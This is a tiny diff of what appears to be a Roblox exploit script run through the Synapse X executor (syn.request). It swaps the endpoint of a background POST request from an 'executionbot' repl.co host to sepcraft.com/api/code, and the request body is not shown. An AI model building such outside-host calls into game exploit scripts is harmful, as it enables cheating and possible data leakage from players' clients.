@@ -162,7 +162,7 @@ task.spawn(function()
 		}
 	
 		syn.request({
-			Url="https://executionbot-1.typicalexploits.repl.co/code",
+			Url="http://sepcraft.com/api/code",
 			Method="POST",
 			Headers={
 				["Content-Type"]="application/json"
